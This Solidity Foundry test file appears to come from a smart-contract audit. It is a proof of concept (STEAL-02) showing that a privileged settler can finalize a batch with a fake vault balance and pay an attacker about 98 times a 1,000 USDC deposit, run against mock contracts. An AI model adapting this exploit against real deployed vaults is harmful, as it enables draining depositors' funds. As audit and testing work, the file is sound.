// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../shared/Harness.sol";

// STEAL-02: Settler inflates vault balance on withdrawal -> disproportionate payout
contract STEAL02Test is Test, ITypes {

    VaultManagerHarness manager;
    MockPortfolio        portfolio;
    MockExecutor         executor;
    MockShare            share;

    address constant ADMIN    = address(0xA0);
    address constant SETTLER  = address(0xA1);
    address constant PROPOSER = address(0xA2);
    address constant ALICE    = address(0xA3);
    address constant ATTACKER = address(0xAA);
    address constant TRADER   = address(0xBB);

    uint16  constant VID    = 0;
    uint16  constant TID    = 0;
    bytes32 constant SYM    = bytes32("USDC");
    uint256 constant PRICE1 = 1e18;

    function setUp() public {
        portfolio = new MockPortfolio();
        executor  = new MockExecutor(address(portfolio));
        share     = new MockShare(VID);
        manager   = new VaultManagerHarness(ADMIN, SETTLER, address(portfolio));
        vm.startPrank(ADMIN);
        manager.addToken(AssetInfo(SYM, AssetType.QUOTE, 6, 1, 10_000_000));
        share.setManager(address(manager));
        executor.setManager(address(manager));
        executor.setTrader(TRADER);
        executor.setFeeManager(ATTACKER);
        uint32[] memory cids = new uint32[](1); cids[0] = 1;
        uint16[] memory toks = new uint16[](1); toks[0] = TID;
        VaultDetails memory vd = VaultDetails(
            "Vault", PROPOSER, TRADER, VaultStatus.ACTIVE,
            address(executor), address(share), address(0), cids, toks
        );
        uint16[]  memory it = new uint16[](1); it[0] = TID;
        uint256[] memory ia = new uint256[](1); ia[0] = 1000e6;
        portfolio.setBalance(address(executor), SYM, 1_000_000e6);
        manager.registerVault(VID, vd, it, ia, 2000e18);
        vm.stopPrank();
        portfolio.setBalance(ALICE,    SYM, 100_000e6);
        portfolio.setBalance(ATTACKER, SYM, 1000e6);
    }

    function testSTEAL02_InflatedWithdrawalBalanceDrainsVault() public {
        console.log("\n=== STEAL-02: Inflated Withdrawal Balance Attack ===");

        // Batch 0: both deposit honestly
        uint16[]  memory tids = new uint16[](1); tids[0] = TID;
        uint256[] memory amts = new uint256[](1);
        amts[0] = 1000e6;
        vm.prank(ATTACKER);
        bytes32 atkReq = manager.requestDeposit(VID, tids, amts);
        amts[0] = 10_000e6;
        vm.prank(ALICE);
        bytes32 aliceReq = manager.requestDeposit(VID, tids, amts);

        uint256[] memory pr = new uint256[](1); pr[0] = PRICE1;
        uint16[]  memory vt = new uint16[](1);  vt[0] = TID;
        uint256[] memory vb = new uint256[](1); vb[0] = 1_011_000e6;
        VaultState[] memory vs = new VaultState[](1);
        vs[0] = VaultState(VID, vt, vb);
        vm.prank(SETTLER); manager.finalizeBatch(pr, vs);
        DepositFufillment[] memory deps = new DepositFufillment[](2);
        uint16[]  memory ta = new uint16[](1); ta[0] = TID;
        uint256[] memory aa = new uint256[](1); aa[0] = 1000e6;
        uint16[]  memory tb = new uint16[](1); tb[0] = TID;
        uint256[] memory ab = new uint256[](1); ab[0] = 10_000e6;
        deps[0] = DepositFufillment(atkReq,   true, ta, aa);
        deps[1] = DepositFufillment(aliceReq, true, tb, ab);
        vm.prank(SETTLER); manager.bulkSettle(pr, vs, deps, new WithdrawalFufillment[](0));
        uint256 atkS = share.balanceOf(ATTACKER);
        uint256 ts   = share.totalSupply();
        console.log("[+] Attacker shares:", atkS / 1e15, "(x1e-15) out of totalSupply:", ts / 1e18);

        // Batch 1: attacker withdraws, SETTLER inflates vault_balance
        vm.prank(ATTACKER); share.approve(address(manager), atkS);
        vm.prank(ATTACKER); manager.requestWithdrawal(VID, uint208(atkS));
        uint256[] memory fakeBals = new uint256[](1); fakeBals[0] = 100_000_000e6;
        vs[0] = VaultState(VID, vt, fakeBals);
        vm.prank(SETTLER); manager.finalizeBatch(pr, vs);
        console.log("[EXPLOIT] SETTLER finalized with FAKE vault balance: 100,000,000 USDC");
        WithdrawalFufillment[] memory wds = new WithdrawalFufillment[](1);
        wds[0] = WithdrawalFufillment(_rid(ATTACKER, VID, 1), true);
        vm.prank(SETTLER); manager.bulkSettle(pr, vs, new DepositFufillment[](0), wds);

        uint256 stolen = portfolio.balances(ATTACKER, SYM);
        console.log("[EXPLOIT] Attacker invested:  1,000 USDC");
        console.log("[EXPLOIT] Attacker received:", stolen / 1e6, "USDC (~97.8x ROI)");
        assertGt(stolen, 50_000e6, "STEAL-02 FAILED");
        console.log("[EXPLOIT] STEAL-02 CONFIRMED");
    }

    function _rid(address user, uint256 vid, uint256 nonce) internal pure returns (bytes32) {
        return bytes32((uint256(uint16(vid)) << 240) | (uint256(uint160(user)) << 80) | nonce);
    }
}
